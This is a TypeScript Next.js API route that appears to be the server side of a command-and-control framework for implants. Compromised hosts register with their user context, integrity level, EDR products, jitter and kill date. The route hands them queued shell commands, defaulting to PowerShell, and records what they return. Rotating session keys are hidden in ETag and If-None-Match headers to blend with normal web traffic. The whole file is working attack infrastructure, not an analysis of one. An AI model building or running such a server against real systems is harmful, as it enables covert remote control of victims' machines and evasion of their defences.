import { type NextRequest, NextResponse } from "next/server"
import { agentDb, commandDb, taskQueueDb } from "@/lib/database"
import { v4 as uuidv4 } from "uuid"
import { randomBytes } from "crypto"

const broadcastResult = (record: any) => {
  try {
    const g = globalThis as any
    if (g.__sseSubscribers && g.__sseSubscribers.size) {
      const payload = JSON.stringify(record)
      const msg = `event: command:result\ndata: ${payload}\n\n`
      for (const sub of g.__sseSubscribers as Set<{ id: number; send: (data: string) => void }>) {
        try { sub.send(msg) } catch {}
      }
    }
  } catch {}
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()

    // Allow probes
    if (body && body.ping) return new NextResponse(null, { status: 204 })

    // If this is a results POST, identify strictly by session header only
    if (Object.prototype.hasOwnProperty.call(body, "task_result") || Object.prototype.hasOwnProperty.call(body, "result")) {
      const headers = Object.fromEntries(request.headers.entries())
      const sess = headers["session"] || headers["if-none-match"]
      if (!sess) return NextResponse.json({ error: "missing session_key" }, { status: 401 })
      const a = agentDb.getBySessionKey(sess)
      if (!a) return NextResponse.json({ error: "unauthorized" }, { status: 401 })

      const fullTask = (a.last_queued_task || "").trim()
      const parts = fullTask.split(/\s+/)
      const cmd = parts.shift() || ""
      const cmdArgs = parts.join(" ")
      const raw = String((body as any).task_result ?? (body as any).result ?? "")
      const isBool = raw.trim().toLowerCase() === "true" || raw.trim().toLowerCase() === "false"
      const success = isBool ? raw.trim().toLowerCase() === "true" : true
      const command_result = isBool ? "" : raw
      const error = success ? "" : (command_result || "Command failed")
      const rec = commandDb.create({
        id: uuidv4(),
        agent_id: a.id,
        command: cmd,
        command_args: cmdArgs,
        command_result,
        success,
        error,
        time_tasked: new Date().toISOString(),
        time_completed: new Date().toISOString(),
      })

      try {
        const ts = new Date().toLocaleTimeString("en-US", { hour12: false, hour: "2-digit", minute: "2-digit", second: "2-digit" })
        const newHistoryEntry = `${ts}\nAgent returned ${cmd} results at ${ts}:\n${command_result || (success ? 'OK' : error)}\n\n`
        const updatedHistory = (a.terminal_history || "") + newHistoryEntry
        agentDb.update(a.id, {
          terminal_history: updatedHistory,
          current_running_task: "",
          last_error_task: success ? "" : a.last_queued_task,
          last_error: success ? "" : error,
          last_seen_timestamp: Date.now(),
          last_callback: new Date().toISOString(),
        })
      } catch {}

      broadcastResult(rec)

      // Rotate session key and return next task (if any), similar to GET /api/health
      const newSession = randomBytes(32).toString("hex")
      let payload: any = { session_key: newSession }
      const next = taskQueueDb.getNextForAgent(a.id)
      if (next) {
        const taskString = `${next.command}${next.args ? " " + next.args : ""}`
        payload.Task = taskString
        try { taskQueueDb.deleteById(next.id) } catch {}
        try { agentDb.update(a.id, { last_queued_task: taskString, current_running_task: taskString, session_key: newSession }) } catch {}
      } else {
        try { agentDb.update(a.id, { session_key: newSession }) } catch {}
      }

      {
        const res = NextResponse.json(payload)
        try { res.headers.set('ETag', newSession) } catch {}
        return res
      }
    }

    // Registration/update
    const nowIso = new Date().toISOString()
    const nowMs = Date.now()
    const agentKey = body.agent_key || body.agentId || body.id
    if (!agentKey) return NextResponse.json({ error: "agent_key required" }, { status: 400 })
    const existing = agentDb.getById(agentKey)

    const common = {
      id: agentKey,
      hostname: String(body.hostname || "host"),
      ip_addr: JSON.stringify(Array.isArray(body.ip_addr) ? body.ip_addr : (body.ip_addr ? [String(body.ip_addr)] : [])),
      os: String(body.os || "unknown"),
      build: String(body.build || ""),
      last_callback: nowIso,
      created_time: existing?.created_time || nowIso,
      callback_interval: Number(body.callback_interval || body.interval || existing?.callback_interval || 60),
      jitter_value: Number(body.jitter_value || body.jitter || existing?.jitter_value || 15),
      jitter_translate: Number(body.jitter_translate || existing?.jitter_translate || 60),
      pid: Number(body.pid || existing?.pid || 0),
      user_context: String(body.user || body.user_context || existing?.user_context || ""),
      base_agent: String(body.base_agent || existing?.base_agent || "toliet_oracle"),
      terminal_history: existing?.terminal_history || "",
      loaded_commands: existing?.loaded_commands || "[]",
      cwd: String(body.cwd || existing?.cwd || "/"),
      last_queued_task: existing?.last_queued_task || "",
      current_running_task: existing?.current_running_task || "",
      last_error_task: existing?.last_error_task || "",
      listener: existing?.listener || "default",
      work_hours: existing?.work_hours || "24/7",
      kill_date: existing?.kill_date || undefined,
      edr: existing?.edr || "[]",
      target_domain: existing?.target_domain || "",
      last_error: existing?.last_error || "",
      default_shell: existing?.default_shell || "powershell",
      integrity_level: existing?.integrity_level || "user",
      status: "connecting" as const,
      last_seen_timestamp: nowMs,
    }

    const session_key = randomBytes(32).toString("hex")
    if (!existing) {
      agentDb.create({ ...(common as any), session_key })
    } else {
      agentDb.update(agentKey, { ...(common as any), session_key })
    }

    {
      const res = NextResponse.json({ session_key })
      try { res.headers.set('ETag', session_key) } catch {}
      return res
    }
  } catch (error) {
    console.error("/api/data error:", error)
    return NextResponse.json({ error: "server error" }, { status: 500 })
  }
}
